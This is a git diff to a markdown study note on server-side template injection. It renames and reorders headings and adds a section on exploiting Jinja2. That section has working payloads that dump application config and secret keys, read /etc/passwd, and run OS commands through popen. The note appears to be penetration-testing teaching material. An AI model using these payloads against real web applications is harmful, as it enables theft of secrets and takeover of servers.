@@ -1,9 +1,12 @@
 - [Server-Side Template Injection (SSTI)](#server-side-template-injection-ssti)
-  - [Teamplating](#teamplating)
-  - [SSTI](#ssti)
-    - [Identifying](#identifying)
-      - [Confirming SSTI](#confirming-ssti)
-      - [Identifying the Template Engine](#identifying-the-template-engine)
+  - [Templating](#templating)
+  - [Identifying](#identifying)
+    - [Confirming SSTI](#confirming-ssti)
+    - [Identifying the Template Engine](#identifying-the-template-engine)
+  - [Exploiting Jinja2](#exploiting-jinja2)
+    - [Information Disclosure](#information-disclosure)
+    - [LFI](#lfi)
+    - [RCE](#rce)
 
 ---
 
@@ -11,7 +14,7 @@
 
 Web applications can utilize templating engines and server-side templates to generate responses such as HTML content dynamically. This generation is often based on user input, enabling the web application to respond to user input dynamically. When an attacker can inject templacte code, a SSTI vulnerability can occur. STTI can lead to various security risks, including data leakage and even full server compromise via remote code execution.
 
-## Teamplating
+## Templating
 
 > [!NOTE]
 > An everyday use case for template engines is a website with shared headers and footers for all pages. A template can dynamically add content but keep the header and footer the same. This avoids duplicates instances of header and footer in different places, reducing complexity and thus enabling better code maintainability. Popular examples of template engines are Jinja and Twig.
@@ -46,13 +49,9 @@ Hello 21y4d!
 Hello Pedant!
 ```
 
-## SSTI
+## Identifying
 
-... occurs when an attacker can inject templating code into a template that is later rendered by the server. If an attacker injects malicious code, the server potentially executes the code during the rendering process, enabling an attacker to take over the server completely.
-
-### Identifying
-
-#### Confirming SSTI
+### Confirming SSTI
 
 The most effective way is to inject special characters with semantic meaning in template engines and observe the web app's behavior. As such, the following test string is commonly used to provoke an error message in a web app vulnerable to SSTI, as it consists of all special characters that have a particular semantic purpose in popular template engines:
 
@@ -72,7 +71,7 @@ Using the test string:
 
 While this does not confirm that the web application is vulnerable to SSTI, it should increase your suspicion that the parameter might be vulnerable.
 
-#### Identifying the Template Engine
+### Identifying the Template Engine
 
 To enable the successful exploitation of an SSTI vuln, you first need to determine the template engine used by the web application. You can utilize slight variations in the behavior of different template engines to achieve this. For instance, consider the following commonly used overview containing slight differences in popular template engines:
 
@@ -135,3 +134,44 @@ This time, the payload was executed by the template engine. Therefore, you follo
 > [!TIP]
 > In Jinja the result will be **7777777**.<br>
 > In Twig the result will be **49**.
+
+## Exploiting Jinja2
+
+### Information Disclosure
+
+You can exploit the SSTI vulnerability to obtain internal information about the web application, including configuration details and the web application's source code. For instance, you can obtain the web application's configuration using the following payload:
+
+```jinja
+{{ config.items() }}
+```
+
+![ssti 5](../../../images/ssti_5.png)
+
+Since this payload dumps the entire web application configuration, including any used secret keys, you can prepare further attacks using the obtained information. You can also execute Python code to obtain information about the web application's source code. You can use the following payload to dump all available built-in functions:
+
+```jinja
+{{ self.__init__.__globals__.__builtins__ }}
+```
+
+![ssti 6](../../../images/ssti_6.png)
+
+### LFI
+
+You can use Python's built-in function ```open``` to include a local file. However, you cannot call the function directly; you need to call it from the ```__builtins__``` dictionary you dumped earlier.
+
+```jinja
+{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
+```
+
+![ssti 7](../../../images/ssti_7.png)
+
+### RCE
+
+To achieve remote code execution in Python, you can use functions provided by the ```os``` library, such as ```system``` or ```popen```. However, if the web application has not already imported this library, you must first import it by calling the built-in function ```import```.
+
+```jinja
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+```
+
+![ssti 8](../../../images/ssti_8.png)
+
